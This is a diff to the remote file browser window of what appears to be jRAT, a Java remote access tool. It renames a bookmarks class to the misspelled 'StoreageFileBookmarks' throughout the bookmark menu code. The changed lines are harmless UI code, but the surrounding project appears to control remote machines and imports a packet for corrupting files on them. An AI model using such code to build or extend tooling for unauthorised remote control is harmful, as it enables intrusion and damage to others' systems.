@@ -60,7 +60,7 @@ import se.jrat.client.packets.outgoing.Packet43CreateDirectory;
 import se.jrat.client.packets.outgoing.Packet47RenameFile;
 import se.jrat.client.packets.outgoing.Packet64FileHash;
 import se.jrat.client.packets.outgoing.Packet70CorruptFile;
-import se.jrat.client.settings.FileBookmarks;
+import se.jrat.client.settings.StoreageFileBookmarks;
 import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.ui.renderers.table.FileViewTableRenderer;
 import se.jrat.client.utils.IconUtils;
@@ -464,7 +464,7 @@ public class FrameRemoteFiles extends BaseFrame {
 			public void popupMenuWillBecomeVisible(PopupMenuEvent arg0) {
 				File bm = new File(txtDir.getText());
 
-				if (FileBookmarks.getGlobal().contains(bm)) {
+				if (StoreageFileBookmarks.getGlobal().contains(bm)) {
 					mnAdd.setEnabled(false);
 					mnRemove.setEnabled(true);
 				} else {
@@ -659,7 +659,7 @@ public class FrameRemoteFiles extends BaseFrame {
 		mnAdd = new JMenuItem("Add");
 		mnAdd.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				FileBookmarks.getGlobal().getBookmarks().add(new File(txtDir.getText()));
+				StoreageFileBookmarks.getGlobal().getBookmarks().add(new File(txtDir.getText()));
 				txtChanged();
 			}
 		});
@@ -669,7 +669,7 @@ public class FrameRemoteFiles extends BaseFrame {
 		mnRemove = new JMenuItem("Remove");
 		mnRemove.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				FileBookmarks.getGlobal().remove(new File(txtDir.getText()));
+				StoreageFileBookmarks.getGlobal().remove(new File(txtDir.getText()));
 				txtChanged();
 			}
 		});
@@ -892,7 +892,7 @@ public class FrameRemoteFiles extends BaseFrame {
 
 		super.setMinimumSize(super.getSize());
 
-		if (FileBookmarks.getGlobal().getBookmarks().size() > 0) {
+		if (StoreageFileBookmarks.getGlobal().getBookmarks().size() > 0) {
 			ActionListener listener = new ActionListener() {
 				public void actionPerformed(ActionEvent arg0) {
 					JMenuItem item = (JMenuItem) arg0.getSource();
@@ -906,7 +906,7 @@ public class FrameRemoteFiles extends BaseFrame {
 
 			ImageIcon icon = IconUtils.getIcon("bookmark");
 
-			for (File file : FileBookmarks.getGlobal().getBookmarks()) {
+			for (File file : StoreageFileBookmarks.getGlobal().getBookmarks()) {
 				JMenuItem item = new JMenuItem();
 				item.setText(file.getAbsolutePath());
 				item.setIcon(icon);
@@ -1003,7 +1003,7 @@ public class FrameRemoteFiles extends BaseFrame {
 
 	public void txtChanged() {
 		File dir = new File(txtDir.getText());
-		if (FileBookmarks.getGlobal().contains(dir)) {
+		if (StoreageFileBookmarks.getGlobal().contains(dir)) {
 			txtDir.setForeground(Color.red);
 		} else {
 			txtDir.setForeground(Color.black);
